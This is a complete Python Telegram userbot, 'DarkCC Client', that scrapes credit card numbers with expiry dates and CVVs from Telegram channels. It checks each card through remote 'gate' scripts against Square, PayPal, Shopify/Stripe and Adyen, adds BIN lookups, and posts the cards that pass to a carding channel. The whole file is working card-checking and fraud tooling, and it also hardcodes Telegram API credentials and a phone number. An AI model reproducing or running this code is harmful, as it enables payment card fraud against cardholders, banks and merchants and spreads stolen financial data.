#!/usr/bin/env python3
import os
import sys
import asyncio
import logging
import re
import time
import json
import aiohttp
import random
from datetime import datetime
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from colorama import init, Fore, Back, Style

init(autoreset=True)

os.makedirs("functions", exist_ok=True)

try:
    from functions.scraper import CCScraperModule
except ImportError as e:
    print(f"Error importing modules: {e}")
    print("Make sure all required files are in the functions directory.")
    sys.exit(1)

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("darkcc_bot.log", encoding='utf-8')
    ]
)
logger = logging.getLogger("DarkCCBot")

API_ID = int(os.getenv("API_ID", "28622965"))
API_HASH = os.getenv("API_HASH", "476bf253c5e288dca854933eb5591fea")
PHONE = os.getenv("PHONE", "+601164176386")
SESSION_FILE = "darkcc_session.txt"

CHANNEL_ID = os.getenv("CHANNEL", "-1002334241878")

TARGET_CHANNELS = [
    "rapistscrapper",
    "RavenBotUpdatesNo2"
]

AUTHORIZED_USERS = [6320782528]

# Timeout settings
APPROVED_CC_TIMEOUT = 300  # 5 minutes in seconds

class BinInfoAPI:
    def __init__(self):
        self.base_url = "https://bins.antipublic.cc/bins/"
        self.session = None
    
    async def initialize(self):
        self.session = aiohttp.ClientSession()
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def get_bin_info(self, cc):
        if not self.session:
            await self.initialize()
        
        bin_code = cc[:6]
        url = f"{self.base_url}{bin_code}"
        
        try:
            async with self.session.get(url) as response:
                if response.status != 200:
                    return None
                
                data = await response.json()
                return data
        except Exception as e:
            logger.error(f"Error fetching BIN info: {e}")
            return None

class PHPGateChecker:
    def __init__(self):
        self.base_url = "https://codertg.me/cdn/"
        self.gates = {
            "square": "square2.php",
            "paypal": "paypal2.php",
            "shopify": "shopify2.php",
            "adyen": "adyen1.php"
        }
        self.gate_names = {
            "square": "Square Auth",
            "paypal": "Paypal $5.99",
            "shopify": "Shopify + Stripe",
            "adyen": "Adyen $0.50"
        }
        self.session = None
        self.stats = {
            "total_checked": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "last_ping": 0
        }
    
    async def initialize(self):
        self.session = aiohttp.ClientSession()
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def check_cc(self, cc, month, year, cvv, gate="square"):
        if gate not in self.gates:
            return {
                "status": "𝐄𝐫𝐫𝐨𝐫 ⚠️",
                "response": f"Invalid gate: {gate}",
                "hits": "NO",
                "bin_info": None,
                "gate": gate
            }
        
        start_time = time.time()
        cc_formatted = f"{cc}|{month}|{year}|{cvv}"
        url = f"{self.base_url}{self.gates[gate]}?lista={cc_formatted}"
        
        try:
            async with self.session.get(url) as response:
                self.stats["last_ping"] = int((time.time() - start_time) * 1000)
                
                if response.status != 200:
                    self.stats["errors"] += 1
                    return {
                        "status": "𝐄𝐫𝐫𝐨𝐫 ⚠️",
                        "response": f"HTTP Error: {response.status}",
                        "hits": "NO",
                        "bin_info": None,
                        "gate": gate,
                        "gate_name": self.gate_names[gate]
                    }
                
                text = await response.text()
                self.stats["total_checked"] += 1
                
                approved = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" in text
                
                if approved:
                    self.stats["approved"] += 1
                    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                    hits = "YES"
                else:
                    self.stats["declined"] += 1
                    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                    hits = "NO"
                
                # Improved regex to extract only the result text, handling HTML tags
                result_match = re.search(r'𝗥𝗲𝘀𝘂𝗹𝘁 ↯ ([^<\n]+)', text)
                result = result_match.group(1).strip() if result_match else "Unknown"
                
                bin_info_match = re.search(r'𝗕𝗶𝗻 𝗜𝗻𝗳𝗼 ↯ (.+?)(?:<br>|$)', text)
                bin_info_text = bin_info_match.group(1).strip() if bin_info_match else ""
                
                bin_parts = bin_info_text.split(" - ") if bin_info_text else []
                bin_info = {}
                
                if len(bin_parts) >= 3:
                    bin_info = {
                        "bank": bin_parts[0],
                        "country_name": bin_parts[1],
                        "type": bin_parts[2],
                        "level": "",
                        "brand": "",
                        "country_flag": "🏳️"
                    }
                
                return {
                    "status": status,
                    "response": result,
                    "hits": hits,
                    "bin_info": bin_info,
                    "gate": gate,
                    "gate_name": self.gate_names[gate],
                    "raw_response": text
                }
                
        except Exception as e:
            self.stats["errors"] += 1
            logger.error(f"Error checking CC with {gate} gate: {e}")
            return {
                "status": "𝐄𝐫𝐫𝐨𝐫 ⚠️",
                "response": f"Error: {str(e)}",
                "hits": "NO",
                "bin_info": None,
                "gate": gate,
                "gate_name": self.gate_names[gate]
            }
    
    async def check_all_gates(self, cc, month, year, cvv):
        tasks = []
        for gate in self.gates:
            tasks.append(self.check_cc(cc, month, year, cvv, gate))
        
        return await asyncio.gather(*tasks)
    
    async def check_with_strategy(self, cc, month, year, cvv):
        square_result = await self.check_cc(cc, month, year, cvv, "square")
        
        if square_result["hits"] == "YES":
            all_results = await asyncio.gather(
                self.check_cc(cc, month, year, cvv, "paypal"),
                self.check_cc(cc, month, year, cvv, "shopify"),
                self.check_cc(cc, month, year, cvv, "adyen")
            )
            
            all_results.insert(0, square_result)
            
            for result in all_results:
                if result["hits"] == "YES":
                    return result, all_results
            
            return square_result, all_results
        
        return square_result, [square_result]

class TerminalUI:
    def __init__(self):
        self.start_time = time.time()
        self.last_update = 0
        self.update_interval = 1.0
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def format_time(self, seconds):
        hours, remainder = divmod(int(seconds), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    def update(self, client, checker):
        current_time = time.time()
        if current_time - self.last_update < self.update_interval:
            return
        
        self.last_update = current_time
        self.clear_screen()
        
        runtime = self.format_time(current_time - self.start_time)
        
        print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}{'DarkCC Client':^60}")
        print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
        
        print(f"{Fore.GREEN}Runtime: {Fore.WHITE}{runtime}")
        print(f"{Fore.GREEN}Status: {Fore.WHITE}{'Running' if client.running else 'Stopped'}")
        print(f"{Fore.GREEN}Paused: {Fore.WHITE}{'Yes' if client.paused else 'No'}")
        
        print(f"{Fore.CYAN}{Style.BRIGHT}{'-' * 60}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}{'Statistics':^60}")
        print(f"{Fore.CYAN}{Style.BRIGHT}{'-' * 60}")
        
        print(f"{Fore.GREEN}Total Checked: {Fore.WHITE}{checker.stats['total_checked']}")
        print(f"{Fore.GREEN}Approved: {Fore.LIGHTGREEN_EX}{checker.stats['approved']}")
        print(f"{Fore.GREEN}Declined: {Fore.RED}{checker.stats['declined']}")
        print(f"{Fore.GREEN}Errors: {Fore.YELLOW}{checker.stats['errors']}")
        print(f"{Fore.GREEN}Last Ping: {Fore.WHITE}{checker.stats['last_ping']}ms")
        
        print(f"{Fore.CYAN}{Style.BRIGHT}{'-' * 60}")
        
        if checker.stats['approved'] > 0:
            success_rate = (checker.stats['approved'] / checker.stats['total_checked']) * 100 if checker.stats['total_checked'] > 0 else 0
            print(f"{Fore.GREEN}Success Rate: {Fore.LIGHTGREEN_EX}{success_rate:.2f}%")
        
        print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
        
        if client.last_activity:
            print(f"{Fore.GREEN}Last Activity: {Fore.WHITE}{client.last_activity}")
        
        # Show next send time if there's a timeout
        if client.last_approved_cc_time:
            next_send_time = client.last_approved_cc_time + APPROVED_CC_TIMEOUT
            current_time = time.time()
            if next_send_time > current_time:
                time_left = next_send_time - current_time
                print(f"{Fore.YELLOW}Next CC can be sent in: {Fore.WHITE}{int(time_left)} seconds")
                if client.pending_approved_ccs:
                    print(f"{Fore.YELLOW}Pending approved CCs: {Fore.WHITE}{len(client.pending_approved_ccs)}")
        
        print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")

class DarkCCClient:
    def __init__(self, api_id, api_hash, phone, session_file, channel_id, target_channels, authorized_users=None):
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone = phone
        self.session_file = session_file
        self.channel_id = channel_id
        self.target_channels = target_channels
        self.authorized_users = authorized_users or []
        self.client = None
        self.session_string = None
        
        self.running = False
        self.paused = False
        self.stopping = False
        self.active_commands = set()
        
        self.scraper = None
        self.checker = None
        self.bin_api = BinInfoAPI()
        
        self.host_task = None
        self.max_concurrent_checks = 5
        self.ui = TerminalUI()
        self.ui_task = None
        self.last_activity = ""
        
        # Timeout tracking
        self.last_approved_cc_time = 0
        self.pending_approved_ccs = []
        self.pending_cc_task = None
        
    async def _load_session(self):
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r') as f:
                    self.session_string = f.read().strip()
                    if self.session_string:
                        logger.info("Session loaded from file")
                        return True
        except Exception as e:
            logger.error(f"Error loading session: {e}")
        
        logger.info("No valid session found")
        return False
    
    async def _save_session(self):
        try:
            with open(self.session_file, 'w') as f:
                f.write(self.session_string)
            logger.info("Session saved to file")
        except Exception as e:
            logger.error(f"Error saving session: {e}")
    
    async def initialize(self):
        await self._load_session()
        
        if self.session_string:
            self.client = TelegramClient(StringSession(self.session_string), self.api_id, self.api_hash)
        else:
            self.client = TelegramClient(StringSession(), self.api_id, self.api_hash)
        
        try:
            await self.client.connect()
            logger.info("Connected to Telegram")
        except Exception as e:
            logger.error(f"Failed to connect to Telegram: {e}")
            return False
        
        if await self.client.is_user_authorized():
            logger.info("User is already authorized")
            
            if not self.session_string:
                self.session_string = self.client.session.save()
                await self._save_session()
            
            self.checker = PHPGateChecker()
            await self.checker.initialize()
            await self.bin_api.initialize()
            
            self.scraper = CCScraperModule(self.client)
            
            return True
        
        logger.info("User is not authorized. Starting login process...")
        
        try:
            await self.client.send_code_request(self.phone)
            logger.info(f"Authentication code sent to {self.phone}")
            
            code = input(f"Enter the code you received on {self.phone}: ")
            
            await self.client.sign_in(self.phone, code)
            logger.info("Successfully signed in with code")
            
        except Exception as e:
            if "phone code invalid" in str(e).lower():
                logger.error("Invalid code entered. Please try again.")
                return False
            elif "2fa" in str(e).lower() or "password" in str(e).lower():
                logger.info("Two-step verification is enabled")
                password = input("Please enter your two-step verification password: ")
                
                try:
                    await self.client.sign_in(password=password)
                    logger.info("Successfully signed in with 2FA")
                except Exception as e2:
                    logger.error(f"Error during two-step verification: {e2}")
                    return False
            else:
                logger.error(f"Error during authentication: {e}")
                return False
        
        self.session_string = self.client.session.save()
        await self._save_session()
        
        self.checker = PHPGateChecker()
        await self.checker.initialize()
        await self.bin_api.initialize()
        
        self.scraper = CCScraperModule(self.client)
        
        logger.info("Authentication successful")
        return True
    
    async def close(self):
        if self.checker:
            await self.checker.close()
        
        if self.bin_api:
            await self.bin_api.close()
        
        if self.client:
            await self.client.disconnect()
            logger.info("Client disconnected")
    
    async def process_cc(self, cc, month, year, cvv):
        self.last_activity = f"Checking {cc}|{month}|{year}|{cvv}"
        result, all_results = await self.checker.check_with_strategy(cc, month, year, cvv)
        
        if result["hits"] == "YES":
            await self.queue_approved_cc(cc, month, year, cvv, result, all_results)
        
        return result, all_results
    
    def get_random_image(self):
        """Get a random image from the available images"""
        images = ["1.png", "2.png", "3.png", "4.png"]
        selected_image = random.choice(images)
        
        # Check if the image exists
        if not os.path.exists(selected_image):
            logger.warning(f"Image {selected_image} not found, using default")
            return None
        
        return selected_image
    
    async def queue_approved_cc(self, cc, month, year, cvv, result, all_results=None):
        """Queue an approved CC for sending, respecting the timeout"""
        cc_data = {
            "cc": cc,
            "month": month,
            "year": year,
            "cvv": cvv,
            "result": result,
            "all_results": all_results,
            "timestamp": time.time()
        }
        
        self.pending_approved_ccs.append(cc_data)
        logger.info(f"Queued approved CC: {cc}|{month}|{year}|{cvv}")
        
        # Start the pending CC processor if not already running
        if not self.pending_cc_task or self.pending_cc_task.done():
            self.pending_cc_task = asyncio.create_task(self.process_pending_ccs())
    
    async def process_pending_ccs(self):
        """Process pending approved CCs, respecting the timeout"""
        while self.pending_approved_ccs and not self.stopping:
            current_time = time.time()
            
            # Check if we can send now
            if self.last_approved_cc_time == 0 or (current_time - self.last_approved_cc_time) >= APPROVED_CC_TIMEOUT:
                # Get the next CC to send
                cc_data = self.pending_approved_ccs.pop(0)
                
                # Send it
                success = await self.send_approved_cc(
                    cc_data["cc"], 
                    cc_data["month"], 
                    cc_data["year"], 
                    cc_data["cvv"], 
                    cc_data["result"], 
                    cc_data["all_results"]
                )
                
                if success:
                    self.last_approved_cc_time = time.time()
                    logger.info(f"Sent approved CC from queue: {cc_data['cc']}|{cc_data['month']}|{cc_data['year']}|{cc_data['cvv']}")
                else:
                    # If failed, put it back in the queue
                    self.pending_approved_ccs.insert(0, cc_data)
                    logger.error(f"Failed to send approved CC, will retry: {cc_data['cc']}|{cc_data['month']}|{cc_data['year']}|{cc_data['cvv']}")
                    await asyncio.sleep(30)  # Wait before retrying
            else:
                # Wait until we can send the next one
                wait_time = APPROVED_CC_TIMEOUT - (current_time - self.last_approved_cc_time)
                logger.info(f"Waiting {int(wait_time)} seconds before sending next approved CC. {len(self.pending_approved_ccs)} in queue.")
                await asyncio.sleep(min(wait_time, 30))  # Check every 30 seconds at most
        
        logger.info("Pending CC processor finished")
    
    async def send_approved_cc(self, cc, month, year, cvv, result, all_results=None):
        gate_name = result.get("gate_name", "Unknown Gate")
        
        # Get enhanced BIN info from API
        bin_info = await self.bin_api.get_bin_info(cc)
        
        # Format the message with the requested template and monospace formatting
        message = (
            f"[⸢↯⸥](https://t.me/Dark_CCZ) [⸤ 𝘿𝘼𝙍𝙆 𝘾𝘾𝙨 ⸣](https://t.me/DARK_CCz)\n"
            f"⸻⸻⸻⸻⸻⸻\n"
            f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗖𝗮𝗿𝗱 ⇾ `{cc}|{month}|{year}|{cvv}`\n"
            f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ `{result['status']}`\n"
            f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗥𝗲𝘀𝘂𝗹𝘁 ⇾ `{result['response']}`\n"
            f"⸻⸻⸻⸻⸻⸻\n"
        )
        
        # Add BIN info
        if bin_info:
            message += (
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗕𝗶𝗻 ⇾ `{cc[:6]}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗜𝗻𝗳𝗼 ⇾ `{bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗕𝗮𝗻𝗸 ⇾ `{bin_info.get('bank', 'Unknown')}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ `{bin_info.get('country_name', 'Unknown')} - {bin_info.get('country_flag', '🏳️')}`\n"
            )
        elif result.get("bin_info"):
            # Fallback to the original bin info if API fails
            bin_info_orig = result["bin_info"]
            message += (
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗕𝗶𝗻 ⇾ `{cc[:6]}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗜𝗻𝗳𝗼 ⇾ `{bin_info_orig.get('brand', 'Unknown')} - {bin_info_orig.get('type', 'Unknown')} - {bin_info_orig.get('level', 'Unknown')}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗕𝗮𝗻𝗸 ⇾ `{bin_info_orig.get('bank', 'Unknown')}`\n"
                f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ `{bin_info_orig.get('country_name', 'Unknown')} - {bin_info_orig.get('country_flag', '🏳️')}`\n"
            )
        
        # Add footer
        message += (
            f"⸻⸻⸻⸻⸻⸻\n"
            f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ `{gate_name}`\n"
            f"[⸢↯⸥](https://t.me/Dark_CCZ) 𝗗𝗲𝘃𝗹𝗼𝗽𝗲𝗿 ⇾ [⸤ 𝙑𝙄𝘾𝙏𝙐𝙎 ⸣](https://t.me/VICTUSxGOD)"
        )
        
        # Get a random image
        image_path = self.get_random_image()
        
        try:
            # Debug log to see what's happening
            logger.info(f"Attempting to send approved CC to channel {self.channel_id}: {cc}|{month}|{year}|{cvv}")
            
            # Try to resolve the channel entity first
            try:
                entity = await self.client.get_entity(int(self.channel_id))
                logger.info(f"Successfully resolved channel entity: {entity.id}")
            except Exception as e:
                logger.error(f"Error resolving channel entity: {e}")
                # Try with string version if int fails
                try:
                    entity = await self.client.get_entity(self.channel_id)
                    logger.info(f"Successfully resolved channel entity with string: {entity.id}")
                except Exception as e2:
                    logger.error(f"Error resolving channel entity with string: {e2}")
                    # Fall back to direct ID
                    entity = self.channel_id
            
            # Send the message with image if available
            if image_path and os.path.exists(image_path):
                logger.info(f"Sending message with image: {image_path}")
                sent_message = await self.client.send_file(
                    entity, 
                    image_path, 
                    caption=message, 
                    parse_mode='md', 
                    link_preview=False
                )
            else:
                logger.info("Sending message without image (image not found)")
                sent_message = await self.client.send_message(
                    entity, 
                    message, 
                    parse_mode='md', 
                    link_preview=False
                )
            
            if sent_message:
                self.last_activity = f"Sent approved CC to channel: {cc}|{month}|{year}|{cvv}"
                logger.info(f"Successfully sent approved CC to channel: {cc}|{month}|{year}|{cvv}")
                return True
            else:
                logger.error("Failed to send message: No message returned")
                return False
                
        except Exception as e:
            logger.error(f"Error sending approved CC to channel: {e}")
            # Try alternative method
            try:
                logger.info("Trying alternative method to send message")
                if image_path and os.path.exists(image_path):
                    await self.client.send_file(
                        int(self.channel_id.replace("-100", "-100")), 
                        image_path, 
                        caption=message, 
                        parse_mode='md', 
                        link_preview=False
                    )
                else:
                    await self.client.send_message(
                        int(self.channel_id.replace("-100", "-100")), 
                        message, 
                        parse_mode='md', 
                        link_preview=False
                    )
                self.last_activity = f"Sent approved CC to channel (alt method): {cc}|{month}|{year}|{cvv}"
                logger.info(f"Successfully sent approved CC to channel (alt method): {cc}|{month}|{year}|{cvv}")
                return True
            except Exception as e2:
                logger.error(f"Error sending approved CC to channel (alt method): {e2}")
                return False
    
    async def process_cc_batch(self, cc_batch):
        tasks = []
        for cc_tuple in cc_batch:
            cc, month, year, cvv = cc_tuple
            
            if len(year) == 4 and year.startswith('20'):
                year = year[2:]
            
            tasks.append(self.process_cc(cc, month, year, cvv))
        
        return await asyncio.gather(*tasks)
    
    async def process_all_ccs(self, ccs):
        results = {}
        
        for i in range(0, len(ccs), self.max_concurrent_checks):
            if self.paused or self.stopping:
                break
                
            batch = ccs[i:i+self.max_concurrent_checks]
            batch_results = await self.process_cc_batch(batch)
            
            for j, cc_tuple in enumerate(batch):
                cc, month, year, cvv = cc_tuple
                if len(year) == 4 and year.startswith('20'):
                    year = year[2:]
                cc_key = f"{cc}|{month}|{year}|{cvv}"
                
                try:
                    results[cc_key] = batch_results[j][0]
                except Exception as e:
                    logger.error(f"Error processing CC {cc_key}: {e}")
                    results[cc_key] = {
                        "status": "𝐄𝐫𝐫𝐨𝐫 ⚠️",
                        "response": f"Error: {str(e)}",
                        "hits": "NO",
                        "bin_info": None,
                        "gate": "error",
                        "gate_name": "Error"
                    }
        
        return results
    
    async def host_task_func(self, event_id=None):
        try:
            if event_id:
                self.active_commands.add(event_id)
            
            while self.running and not self.stopping:
                if self.paused:
                    await asyncio.sleep(1)
                    continue
                
                self.last_activity = "Scraping CCs from target channels..."
                logger.info("Scraping CCs from target channels...")
                ccs = await self.scraper.scrape_all_channels(self.target_channels, limit=200, days_back=3)
                
                if not ccs:
                    self.last_activity = "No CCs found in the target channels."
                    logger.info("No CCs found in the target channels.")
                    await asyncio.sleep(300)
                    continue
                
                self.last_activity = f"Found {len(ccs)} unique CCs. Starting to check them..."
                logger.info(f"Found {len(ccs)} unique CCs. Starting to check them...")
                
                results = await self.process_all_ccs(ccs)
                
                approved = sum(1 for r in results.values() if r['hits'] == "YES")
                declined = sum(1 for r in results.values() if r['hits'] == "NO")
                
                self.last_activity = f"Finished checking {len(results)} CCs. Approved: {approved}, Declined: {declined}"
                logger.info(f"Finished checking {len(results)} CCs. Approved: {approved}, Declined: {declined}")
                
                await asyncio.sleep(600)
                
        except Exception as e:
            logger.error(f"Error in host task: {e}")
            
        finally:
            if event_id:
                self.active_commands.discard(event_id)
            
            if self.running:
                logger.info("Host task ended unexpectedly. Resetting running state.")
                self.running = False
    
    async def ui_update_task(self):
        try:
            while not self.stopping:
                self.ui.update(self, self.checker)
                await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Error in UI update task: {e}")
    
    async def setup_message_handlers(self):
        @self.client.on(events.NewMessage)
        async def message_handler(event):
            if not event.is_private:
                return
            
            if self.authorized_users and event.sender_id not in self.authorized_users:
                logger.info(f"Unauthorized message from {event.sender_id}: {event.text}")
                return
            
            text = event.text.strip()
            
            if text.startswith('.start'):
                await event.respond("Welcome to DarkCC Client! Use .help to see available commands.")
                logger.info(f"Start command received from {event.sender_id}")
                self.last_activity = "Start command received"
                
            elif text.startswith('.help'):
                help_text = (
                    "Available commands:\n"
                    ".start - Start the client\n"
                    ".help - Show this help message\n"
                    ".host - Start scraping and checking CCs\n"
                    ".pause - Pause the scraping and checking process\n"
                    ".stop - Stop the scraping and checking process\n"
                    ".str <cc> - Check a specific CC (format: cc|mm|yy|cvv)\n"
                    ".status - Show client status\n"
                    ".channel <channel_id> - Set the output channel"
                )
                await event.respond(help_text)
                logger.info(f"Help command received from {event.sender_id}")
                self.last_activity = "Help command received"
                
            elif text.startswith('.host'):
                if self.running and not self.paused:
                    await event.respond("Client is already running.")
                    return
                
                self.running = True
                self.paused = False
                
                await event.respond("Starting to scrape and check CCs...")
                logger.info(f"Host command received from {event.sender_id}")
                self.last_activity = "Host command received - starting scraper"
                
                if self.host_task and not self.host_task.done():
                    self.host_task.cancel()
                
                self.host_task = asyncio.create_task(self.host_task_func(event.id))
                
            elif text.startswith('.pause'):
                if not self.running:
                    await event.respond("Client is not running.")
                    return
                
                if self.paused:
                    await event.respond("Client is already paused.")
                    return
                
                self.paused = True
                await event.respond("Paused scraping and checking CCs.")
                logger.info(f"Pause command received from {event.sender_id}")
                self.last_activity = "Pause command received"
                
            elif text.startswith('.stop'):
                if not self.running:
                    await event.respond("Client is not running.")
                    return
                
                self.running = False
                self.paused = False
                
                if self.host_task and not self.host_task.done():
                    self.host_task.cancel()
                    self.host_task = None
                
                await event.respond("Stopped scraping and checking CCs.")
                logger.info(f"Stop command received from {event.sender_id}")
                self.last_activity = "Stop command received"
                
            elif text.startswith('.str'):
                parts = text.split(maxsplit=1)
                
                if len(parts) < 2:
                    await event.respond("Please provide a CC to check. Format: .str cc|mm|yy|cvv")
                    return
                
                cc_text = parts[1].strip()
                
                cc_match = self.scraper.extract_cc_from_text(cc_text)
                
                if not cc_match:
                    await event.respond("Invalid CC format. Please use: cc|mm|yy|cvv")
                    return
                
                cc, month, year, cvv = cc_match[0]
                
                await event.respond(f"Checking CC: {cc}|{month}|{year}|{cvv}...")
                logger.info(f"Check command received from {event.sender_id}")
                self.last_activity = f"Checking CC: {cc}|{month}|{year}|{cvv}"
                
                try:
                    self.active_commands.add(event.id)
                    
                    result, all_results = await self.process_cc(cc, month, year, cvv)
                    
                    response = (
                        f"Result for {cc}|{month}|{year}|{cvv}:\n"
                        f"Gate: {result.get('gate_name', 'Unknown')}\n"
                        f"Status: {result['status']}\n"
                        f"Response: {result['response']}\n"
                    )
                    
                    if result.get("bin_info"):
                        bin_info = result["bin_info"]
                        response += (
                            f"BIN Info:\n"
                            f"- Bank: {bin_info.get('bank', 'Unknown')}\n"
                            f"- Country: {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}\n"
                            f"- Type: {bin_info.get('type', 'Unknown')}\n"
                        )
                    
                    if len(all_results) > 1:
                        response += "\nResults from other gates:\n"
                        for gate_result in all_results[1:]:
                            response += (
                                f"- {gate_result.get('gate_name', 'Unknown')}: "
                                f"{gate_result['status']} - {gate_result['response']}\n"
                            )
                    
                    await event.respond(response)
                    
                except Exception as e:
                    logger.error(f"Error in check command: {e}")
                    await event.respond(f"Error: {str(e)}")
                    
                finally:
                    self.active_commands.discard(event.id)
            
            elif text.startswith('.channel'):
                parts = text.split(maxsplit=1)
                
                if len(parts) < 2:
                    await event.respond(f"Current output channel: {self.channel_id}\nTo change, use: .channel <channel_id>")
                    return
                
                new_channel = parts[1].strip()
                old_channel = self.channel_id
                self.channel_id = new_channel
                
                await event.respond(f"Output channel changed from {old_channel} to {new_channel}")
                logger.info(f"Channel changed from {old_channel} to {new_channel} by {event.sender_id}")
                self.last_activity = f"Changed output channel to {new_channel}"
                
            elif text.startswith('.status'):
                status_text = (
                    "Client Status:\n"
                    f"Running: {self.running}\n"
                    f"Paused: {self.paused}\n"
                    f"Stopping: {self.stopping}\n"
                    f"Active commands: {len(self.active_commands)}\n"
                    f"Target channels: {', '.join(self.target_channels)}\n"
                    f"Output channel: {self.channel_id}\n\n"
                    f"Statistics:\n"
                    f"Total Checked: {self.checker.stats['total_checked']}\n"
                    f"Approved: {self.checker.stats['approved']}\n"
                    f"Declined: {self.checker.stats['declined']}\n"
                    f"Errors: {self.checker.stats['errors']}\n"
                    f"Last Ping: {self.checker.stats['last_ping']}ms\n"
                )
                
                # Add pending CC info
                if self.pending_approved_ccs:
                    status_text += f"\nPending approved CCs: {len(self.pending_approved_ccs)}\n"
                
                # Add timeout info
                if self.last_approved_cc_time > 0:
                    next_send_time = self.last_approved_cc_time + APPROVED_CC_TIMEOUT
                    current_time = time.time()
                    if next_send_time > current_time:
                        time_left = next_send_time - current_time
                        status_text += f"Next CC can be sent in: {int(time_left)} seconds\n"
                
                await event.respond(status_text)
                logger.info(f"Status command received from {event.sender_id}")
                self.last_activity = "Status command received"
                
            elif text.startswith('.adduser'):
                if self.authorized_users and event.sender_id not in self.authorized_users:
                    return
                
                parts = text.split(maxsplit=1)
                
                if len(parts) < 2:
                    await event.respond("Please provide a user ID to add. Format: .adduser 123456789")
                    return
                
                try:
                    user_id = int(parts[1].strip())
                    
                    if user_id in self.authorized_users:
                        await event.respond(f"User {user_id} is already authorized.")
                        return
                    
                    self.authorized_users.append(user_id)
                    await event.respond(f"User {user_id} added to authorized users.")
                    logger.info(f"User {user_id} added to authorized users by {event.sender_id}")
                    self.last_activity = f"Added user {user_id} to authorized users"
                    
                except ValueError:
                    await event.respond("Invalid user ID. Please provide a numeric user ID.")
    
    async def run(self):
        logger.info("Starting client...")
        
        await self.setup_message_handlers()
        
        await self.client.start()
        
        try:
            me = await self.client.get_me()
            logger.info(f"Client started as: {me.first_name} (@{me.username if me.username else 'None'})")
            
            if not self.authorized_users:
                self.authorized_users.append(me.id)
                logger.info(f"Added current user (ID: {me.id}) to authorized users")
            
            # Test channel access
            try:
                logger.info(f"Testing access to channel {self.channel_id}")
                entity = await self.client.get_entity(int(self.channel_id))
                logger.info(f"Successfully accessed channel: {entity.title if hasattr(entity, 'title') else entity.id}")
            except Exception as e:
                logger.error(f"Warning: Could not access channel {self.channel_id}: {e}")
                print(f"{Fore.YELLOW}Warning: Could not access channel {self.channel_id}: {e}")
                print(f"{Fore.YELLOW}Make sure the channel ID is correct and the user has access to it.")
            
            # Check for image files
            image_files = ["1.png", "2.png", "3.png", "4.png"]
            missing_files = [img for img in image_files if not os.path.exists(img)]
            if missing_files:
                logger.warning(f"Warning: The following image files are missing: {', '.join(missing_files)}")
                print(f"{Fore.YELLOW}Warning: The following image files are missing: {', '.join(missing_files)}")
                print(f"{Fore.YELLOW}Make sure these files are in the same directory as the script.")
            
            self.ui_task = asyncio.create_task(self.ui_update_task())
            
        except Exception as e:
            logger.error(f"Error getting user info: {e}")
        
        self.stopping = False
        try:
            while not self.stopping:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            logger.info("Client run task cancelled")
            self.stopping = True
        
        if self.ui_task and not self.ui_task.done():
            self.ui_task.cancel()
        
        logger.info("Client stopped.")

async def main():
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'DarkCC Client':^60}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 60}")
    print(f"{Fore.GREEN}Initializing...")
    
    client = DarkCCClient(API_ID, API_HASH, PHONE, SESSION_FILE, CHANNEL_ID, TARGET_CHANNELS, AUTHORIZED_USERS)
    
    try:
        print(f"{Fore.GREEN}Connecting to Telegram...")
        if not await client.initialize():
            logger.error("Failed to initialize client. Exiting.")
            print(f"{Fore.RED}Failed to initialize client. Check the logs for details.")
            return
        
        print(f"{Fore.GREEN}Connected successfully!")
        print(f"{Fore.GREEN}Starting client...")
        
        await client.run()
    
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\nOperation cancelled by user.")
        client.stopping = True
    
    except Exception as e:
        logger.error(f"Error in main: {e}")
        print(f"{Fore.RED}An error occurred: {e}")
    
    finally:
        print(f"{Fore.YELLOW}Shutting down...")
        await client.close()
        print(f"{Fore.GREEN}Client closed.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\nClient stopped by user.")
    except Exception as e:
        print(f"{Fore.RED}Fatal error: {e}")
